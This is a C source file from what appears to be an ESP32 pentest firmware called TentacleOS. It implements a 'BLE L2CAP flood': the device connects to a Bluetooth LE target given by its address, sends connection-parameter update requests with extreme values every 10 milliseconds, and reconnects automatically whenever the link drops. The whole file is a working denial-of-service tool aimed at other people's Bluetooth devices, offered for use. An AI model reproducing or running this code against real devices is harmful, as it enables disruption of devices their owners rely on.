// Copyright (c) 2025 HIGH CODE LLC
//
// TentacleOS is free software: you can redistribute it and/or modify
// it under the terms of the GNU General Public License as published by
// the Free Software Foundation, either version 3 of the License, or
// (at your option) any later version.
//
// TentacleOS is distributed in the hope that it will be useful,
// but WITHOUT ANY WARRANTY; without even the implied warranty of
// MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
// GNU General Public License for more details.
//
// You should have received a copy of the GNU General Public License
// along with TentacleOS. If not, see <https://www.gnu.org/licenses/>.

#include "ble_l2cap_flood.h"

#include <string.h>

#include "esp_heap_caps.h"
#include "esp_log.h"
#include "freertos/FreeRTOS.h"
#include "freertos/semphr.h"
#include "freertos/task.h"
#include "sys_prio.h"
#include "host/ble_gap.h"

#include "bluetooth_service.h"

static const char *TAG = "BLE_L2CAP_FLOOD";

#define L2CAP_STACK_SIZE          4096
#define L2CAP_TASK_PRIORITY SYS_PRIO_SERVICE_HI
#define L2CAP_CONNECT_TIMEOUT     10000
#define L2CAP_RETRY_DELAY_MS      100
#define L2CAP_RECONNECT_DELAY_MS  1000
#define L2CAP_FLOOD_DELAY_MS      10
#define L2CAP_STOP_POLL_MS        50
#define L2CAP_STOP_RETRIES        20
#define L2CAP_ITVL_MIN            6
#define L2CAP_ITVL_MAX            3200
#define L2CAP_SUPERVISION_TIMEOUT 500

static volatile bool s_is_running = false;
static uint8_t s_target_addr[6];
static uint8_t s_target_addr_type;
static uint16_t s_conn_handle = BLE_HS_CONN_HANDLE_NONE;

static TaskHandle_t s_l2cap_task_handle = NULL;
static StackType_t *s_l2cap_task_stack = NULL;
static StaticTask_t *s_l2cap_task_tcb = NULL;
static SemaphoreHandle_t s_l2cap_sem = NULL;

static void l2cap_task(void *pvParameters);

static int l2cap_gap_event(struct ble_gap_event *event, void *arg) {
  switch (event->type) {
    case BLE_GAP_EVENT_CONNECT:
      if (event->connect.status == 0) {
        ESP_LOGI(TAG, "Connected to target. Starting L2CAP flood...");
        s_conn_handle = event->connect.conn_handle;
        if (s_l2cap_sem != NULL)
          xSemaphoreGive(s_l2cap_sem);
      } else {
        ESP_LOGW(TAG, "Connection failed status=%d", event->connect.status);
        s_conn_handle = BLE_HS_CONN_HANDLE_NONE;
        if (s_l2cap_sem != NULL)
          xSemaphoreGive(s_l2cap_sem);
      }
      break;

    case BLE_GAP_EVENT_DISCONNECT:
      ESP_LOGI(TAG, "Disconnected.");
      s_conn_handle = BLE_HS_CONN_HANDLE_NONE;
      if (s_l2cap_sem != NULL)
        xSemaphoreGive(s_l2cap_sem);
      break;

    case BLE_GAP_EVENT_CONN_UPDATE:
      break;

    case BLE_GAP_EVENT_CONN_UPDATE_REQ:
      return 0;

    default:
      break;
  }
  return 0;
}

esp_err_t ble_l2cap_flood_start(const uint8_t *addr, uint8_t addr_type) {
  if (s_is_running) {
    return ESP_ERR_INVALID_STATE;
  }

  if (!bluetooth_service_is_running()) {
    ESP_LOGE(TAG, "Bluetooth service not running");
    return ESP_FAIL;
  }

  memcpy(s_target_addr, addr, 6);
  s_target_addr_type = addr_type;

  if (s_l2cap_sem == NULL) {
    s_l2cap_sem = xSemaphoreCreateBinary();
  }

  s_conn_handle = BLE_HS_CONN_HANDLE_NONE;

  s_l2cap_task_stack =
      (StackType_t *)heap_caps_malloc(L2CAP_STACK_SIZE * sizeof(StackType_t), MALLOC_CAP_SPIRAM);
  s_l2cap_task_tcb = (StaticTask_t *)heap_caps_malloc(sizeof(StaticTask_t), MALLOC_CAP_SPIRAM);

  if (s_l2cap_task_stack == NULL || s_l2cap_task_tcb == NULL) {
    ESP_LOGE(TAG, "Failed to allocate memory for l2cap task");
    free(s_l2cap_task_stack);
    free(s_l2cap_task_tcb);
    s_l2cap_task_stack = NULL;
    s_l2cap_task_tcb = NULL;
    return ESP_ERR_NO_MEM;
  }

  s_is_running = true;
  s_l2cap_task_handle = xTaskCreateStatic(l2cap_task,
                                          "ble_l2cap_task",
                                          L2CAP_STACK_SIZE,
                                          NULL,
                                          L2CAP_TASK_PRIORITY,
                                          s_l2cap_task_stack,
                                          s_l2cap_task_tcb);

  if (s_l2cap_task_handle == NULL) {
    s_is_running = false;
    return ESP_FAIL;
  }

  return ESP_OK;
}

esp_err_t ble_l2cap_flood_stop(void) {
  if (!s_is_running)
    return ESP_OK;

  s_is_running = false;

  if (s_l2cap_sem != NULL) {
    xSemaphoreGive(s_l2cap_sem);
  }

  int retry = L2CAP_STOP_RETRIES;
  while (s_l2cap_task_handle != NULL && retry > 0) {
    vTaskDelay(pdMS_TO_TICKS(L2CAP_STOP_POLL_MS));
    retry--;
  }

  if (s_l2cap_task_stack != NULL) {
    free(s_l2cap_task_stack);
    s_l2cap_task_stack = NULL;
  }
  if (s_l2cap_task_tcb != NULL) {
    free(s_l2cap_task_tcb);
    s_l2cap_task_tcb = NULL;
  }

  if (s_l2cap_sem != NULL) {
    vSemaphoreDelete(s_l2cap_sem);
    s_l2cap_sem = NULL;
  }

  ESP_LOGI(TAG, "L2CAP Flood stopped");
  return ESP_OK;
}

bool ble_l2cap_flood_is_running(void) {
  return s_is_running;
}

static void l2cap_task(void *pvParameters) {
  ESP_LOGI(TAG, "L2CAP Flood Task Started");

  struct ble_gap_conn_params conn_params = {0};
  conn_params.scan_itvl = 0x0010;
  conn_params.scan_window = 0x0010;
  conn_params.itvl_min = BLE_GAP_INITIAL_CONN_ITVL_MIN;
  conn_params.itvl_max = BLE_GAP_INITIAL_CONN_ITVL_MAX;
  conn_params.latency = 0;
  conn_params.supervision_timeout = 0x0100;
  conn_params.min_ce_len = 0x0010;
  conn_params.max_ce_len = 0x0300;

  ble_addr_t addr;
  memcpy(addr.val, s_target_addr, 6);
  addr.type = s_target_addr_type;

  while (s_is_running) {
    if (s_conn_handle == BLE_HS_CONN_HANDLE_NONE) {
      bluetooth_service_stop_advertising();

      xSemaphoreTake(s_l2cap_sem, 0);

      ESP_LOGD(TAG, "Connecting...");
      int rc = ble_gap_connect(bluetooth_service_get_own_addr_type(),
                               &addr,
                               L2CAP_CONNECT_TIMEOUT,
                               &conn_params,
                               l2cap_gap_event,
                               NULL);

      if (rc == 0) {
        xSemaphoreTake(s_l2cap_sem, portMAX_DELAY);
      } else if (rc == BLE_HS_EALREADY) {
        vTaskDelay(pdMS_TO_TICKS(L2CAP_RETRY_DELAY_MS));
      } else {
        ESP_LOGE(TAG, "Connect failed: %d", rc);
        vTaskDelay(pdMS_TO_TICKS(L2CAP_RECONNECT_DELAY_MS));
      }
    } else {
      struct ble_gap_upd_params params;
      params.itvl_min = L2CAP_ITVL_MIN;
      params.itvl_max = L2CAP_ITVL_MAX;
      params.latency = 0;
      params.supervision_timeout = L2CAP_SUPERVISION_TIMEOUT;
      params.min_ce_len = 0;
      params.max_ce_len = 0;

      int rc = ble_gap_update_params(s_conn_handle, &params);

      if (rc == BLE_HS_ENOTCONN) {
        s_conn_handle = BLE_HS_CONN_HANDLE_NONE;
      }

      vTaskDelay(pdMS_TO_TICKS(L2CAP_FLOOD_DELAY_MS));
    }
  }

  if (s_conn_handle != BLE_HS_CONN_HANDLE_NONE) {
    ble_gap_terminate(s_conn_handle, BLE_ERR_REM_USER_CONN_TERM);
    s_conn_handle = BLE_HS_CONN_HANDLE_NONE;
  }

  s_l2cap_task_handle = NULL;
  vTaskDelete(NULL);
}
